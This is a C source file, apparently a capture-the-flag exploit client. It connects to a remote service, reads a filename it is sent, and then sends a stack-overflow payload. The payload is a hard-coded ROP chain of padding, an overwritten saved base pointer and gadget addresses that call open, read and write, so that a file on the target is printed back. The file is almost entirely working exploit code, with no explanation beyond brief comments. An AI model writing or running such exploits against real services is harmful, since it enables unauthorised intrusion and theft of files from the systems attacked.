#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

int main(int argc, char **argv) {
	if (argc != 3) {
        fprintf(stderr, "Not enough arguments.\n");
        return 1;
    }

    int rc, fd = -1;
    ssize_t size;
    char buf[1024];
    buf[1023] = '\0';
    struct addrinfo hints = { .ai_socktype = SOCK_STREAM };
    struct addrinfo *info = NULL, *p;
    int exit_code = EXIT_FAILURE;

    char filename_buf[20];
    filename_buf[19] = '\0';

    unsigned long buf_addr_l;
    unsigned long  bp_addr_l;

    // lookup service
    rc = getaddrinfo(argv[1], argv[2], &hints, &info);
    if (0 != rc) {
        fprintf(stderr, "error looking up %s\n", argv[1]);
        goto done;
    }

    // connect to service
    for (p = info; p; p = p->ai_next) {
        fd = socket(p->ai_family, p->ai_socktype, 0);
        if (-1 == fd) {
            continue;
        }

        rc = connect(fd, p->ai_addr, p->ai_addrlen);
        if (rc > -1) {
            break;
        }
    }

    // char *flag_addr;
    // char *strt;

    // // read bytes from service 
    for (;;) {
        size = recv(fd, filename_buf, sizeof(filename_buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            printf("%s\n", filename_buf);
            break;
        } else {
            perror("error reading from connection");
            goto done;
        }
    }

    char buffer[] =
    "\x61\x61\x61\x61\x61\x61\x61\x61" // Buffer
    "\x62\x62\x62\x62\x62\x62\x62\x62" // Saved BP
    "\xec\x0c\x40\x00\x00\x00\x00\x00" // pop rdi
    "\x20\x53\x40\x00\x00\x00\x00\x00" // filename
    "\xc4\x07\x40\x00\x00\x00\x00\x00" // pop rsi
    "\x00\x00\x00\x00\x00\x00\x00\x00" // read only
    "\xf6\x07\x40\x00\x00\x00\x00\x00" // open
    
    "\x89\x08\x40\x00\x00\x00\x00\x00" // mov rax, rdi
    "\xc4\x07\x40\x00\x00\x00\x00\x00" // pop rsi
    "\x14\xfe\xff\xff\xff\xff\xff\x7f" // addr buff
    "\xb8\x08\x40\x00\x00\x00\x00\x00" // pop rdx
    "\x64\x00\x00\x00\x00\x00\x00\x00" // size to read
    "\xfc\x42\x40\x00\x00\x00\x00\x00" // read

    "\xec\x0c\x40\x00\x00\x00\x00\x00" // pop rdi 
    "\x01\x00\x00\x00\x00\x00\x00\x00" // 1 (STD_OUT)
    "\xc4\x07\x40\x00\x00\x00\x00\x00" // pop rsi
    "\x14\xfe\xff\xff\xff\xff\xff\x7f" // addr buff
    "\xb8\x08\x40\x00\x00\x00\x00\x00" // pop rdx
    "\x64\x00\x00\x00\x00\x00\x00\x00" // size to write
    "\x27\x43\x40\x00\x00\x00\x00\x00" // write

    "\xec\x0c\x40\x00\x00\x00\x00\x00" // pop rdi
    "\x2a\x00\x00\x00\x00\x00\x00\x00" // 42
    "\x30\x10\x40\x00\x00\x00\x00\x00" // exit
    ;

    // send data
    ssize_t bytes_sent = send(fd, buffer, sizeof(buffer), 0);
    if (bytes_sent == -1) {
        perror("Send failed");
        goto done;
    }

    // receive the file contents
    for (;;) {
        size = recv(fd, buf, sizeof(buf), 0);
        if (0 == size) {
            break;
        } else if (size > 0) {
            printf("%s\n", buf);
            break;
        } else {
            perror("error reading from connection");
            goto done;
        }
    }
        
    // exit
    exit_code = EXIT_SUCCESS;

done:
    if (fd != -1) {
        close(fd);
    }

    exit(exit_code);

    return 0;
}